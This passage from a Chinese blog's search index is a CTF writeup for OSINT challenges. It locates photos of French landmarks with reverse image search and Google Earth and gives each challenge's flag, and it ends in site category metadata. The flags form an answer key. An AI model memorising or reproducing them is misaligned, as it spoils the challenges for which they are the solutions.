1ectf&#123;DN5_3xf1ltr@t10n_15_flnd3d&#125; 6. OsintProject-153-Q1 这道题我们会得到这张图片： 通过谷歌识图可以很轻易地知道这个地方是：Falls Caramy, 法语原名为Chutes_du_Caramy。 得到flag： 1ectf&#123;Chutes_du_Caramy&#125; Project-153-Q2 这道题我们会得到这张图片： 通过谷歌识图可以判断出来这张照片是在 Massif de l’Esterel 附近拍摄的。 但由于题目要求的是拍摄时所处的具体位置，所以我们还需要找些其他的线索。 注意到图片远处这里，有一座全是房子的半岛： 于是我们打开Google Earth，查看Massif de l’Esterel附近的海岸线。可以发现这个地方非常想图中的半岛： 并且点开 Calanque de l’Esterel, 83700 Saint-Raphaël, 法国 的相册可以看到这样一张图片： 跟我们图片里的一模一样。沿着这个方向依次尝试带有名字的地点，便可以成功找到拍摄地：Pointe de l’Observatoire, D559, 83700 Saint-Raphaël, 法国。 1ectf&#123;Pointe_de_l&#x27;Observatoire&#125; Project-153-Q3 这道题我们会得到这张图片： 再次通过谷歌识图可以发现图片所在地是 Rocher de Roquebrune： 在Google Earth找到这里 便可以在相册里发现这张图片，大概率是题目所指的“monster： 所以答案为左下角的作者名字。 1ectf&#123;Michael_DELAETER&#125; Project-153-Q4 首先通过谷歌识图判断出照片所在地应该是：Bormes-les-Mimosas 在Google Earth找到这里： 根据照片拍摄角度以及题目描述不难猜出远处的那座岛应该是 Île du Levant。 1ectf&#123;Île_du_Levant&#125; Project-153-Q5 这道题我们会得到这张图片： 这道题会碰到一个非常有意思的事情。我们拿到的图片的文件大小为29.8 MB，而谷歌识图的上限为20MB，所以我们首先需要压缩一下图片的大小才能使用谷歌识图。我这里是用微信来进行有损压缩的。 然后便可以用谷歌识图来确认地点： 1ectf&#123;Gros_Cerveau&#125; (在法语中，“le” 是阳性单数定冠词，所以不包含在答案内。) Project-153-Q6 这道题我们会得到这张图片： 再次通过谷歌识图我们可以找到这样一条Instergram： （为了防止侵犯个人隐私我给图片打了个码。） 于是可以得知这张照片的拍摄所在地为 Moustiers-Sainte-Marie （zipcode：04360）。 至于台阶数可以直接利用开了联网功能的ChatGPT所搜即可： 最后的flag为： 1ectf&#123;262_04360&#125; PNJ - 3 - Gouzou 这道题我们会得到一个文件夹，里面有非常多的文件，它说的这个“the”属实是有点意义不明，所以我们先去搜索看一下GOUZOU是什么： 发现是法国艺术家JACE创作一个没有五官的诙谐卡通形象。根据这条线索我们可以锁定这张图片（也就是说我们需要找的应该是这张图片的具体位置）： 根据谷歌识图可以发现这张照片在 “Île de Ré”（雷岛）： 通过搜索“île de ré gouzou”可以找到这个网页：https://www.realahune.fr/les-murs-dexpression-de-latlantique/，并且发现： 于是我们确定这幅画是在”la digue du Boutillon, île de Ré”(是一座防波堤)，得到flag： 1ectf&#123;digue_du_boutillon&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"writeup","slug":"CTF/writeup","permalink":"http://example.com/categories/CTF/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://example.com/tags/writeup/"}]}],"categories":[{"name":"ACM","slug":"ACM","permalink":"http://example.com/categories/ACM/"},{"name":"Codeforce","slug":"ACM/Codeforce","permalink":"http://example.com/categories/ACM/Codeforce/"},{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"http://example.com/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM课程笔记/GBS-操作系统","permalink":"http://example.com/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"ERA 计算机体系结构","slug":"TUM课程笔记/ERA-计算机体系结构","permalink":"http://example.com/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"Reverse Engineering","slug":"CTF/Reverse-Engineering","permalink":"http://example.com/categories/CTF/Reverse-Engineering/"},{"name":"Dantenbank 数据库","slug":"TUM课程笔记/Dantenbank-数据库","permalink":"http://example.com/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Dantenbank-%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"CTF小知识","slug":"CTF/CTF小知识","permalink":"http://example.com/categories/CTF/CTF%E5%B0%8F%E7%9F%A5%E8%AF%86/"},{"name":"writeup","slug":"CTF/writeup","permalink":"http://example.com/categories/CTF/writeup/"}],"tags":[{"name":"ACM","slug":"ACM","permalink":"http://example.com/tags/ACM/"},{"name":"Betriebssysteme, Operating System, 操作系统, 文件系统","slug":"Betriebssysteme-Operating-System-操作系统-文件系统","permalink":"http://example.com/tags/Betriebssysteme-Operating-System-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"},{"name":"Betriebssysteme, Operating System, 操作系统, 输入/输出","slug":"Betriebssysteme-Operating-System-操作系统-输入-输出","permalink":"http://example.com/tags/Betriebssysteme-Operating-System-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%BE%93%E5%85%A5-%E8%BE%93%E5%87%BA/"},{"name":"Rechnerarchitektur, 计算机体系结构, 汇编语言, RISC-V","slug":"Rechnerarchitektur-计算机体系结构-汇编语言-RISC-V","permalink":"http://example.com/tags/Rechnerarchitektur-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-RISC-V/"},{"name":"Rechnerarchitektur, 计算机体系结构","slug":"Rechnerarchitektur-计算机体系结构","permalink":"http://example.com/tags/Rechnerarchitektur-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"name":"Reverse Engineering, HTB","slug":"Reverse-Engineering-HTB","permalink":"http://example.com/tags/Reverse-Engineering-HTB/"},{"name":"Betriebssysteme, Operating System, 操作系统, 虚拟化, 虚拟机, container","slug":"Betriebssysteme-Operating-System-操作系统-虚拟化-虚拟机-container","permalink":"http://example.com/tags/Betriebssysteme-Operating-System-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%99%9A%E6%8B%9F%E5%8C%96-%E8%99%9A%E6%8B%9F%E6%9C%BA-container/"},{"name":"Betriebssysteme, Operating System, 操作系统","slug":"Betriebssysteme-Operating-System-操作系统","permalink":"http://example.com/tags/Betriebssysteme-Operating-System-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"Datenbank, Database, 数据库, SQL","slug":"Datenbank-Database-数据库-SQL","permalink":"http://example.com/tags/Datenbank-Database-%E6%95%B0%E6%8D%AE%E5%BA%93-SQL/"},{"name":"socket,remote","slug":"socket-remote","permalink":"http://example.com/tags/socket-remote/"},{"name":"writeup","slug":"writeup","permalink":"http://example.com/tags/writeup/"},{"name":"CTF,哈希","slug":"CTF-哈希","permalink":"http://example.com/tags/CTF-%E5%93%88%E5%B8%8C/"}]}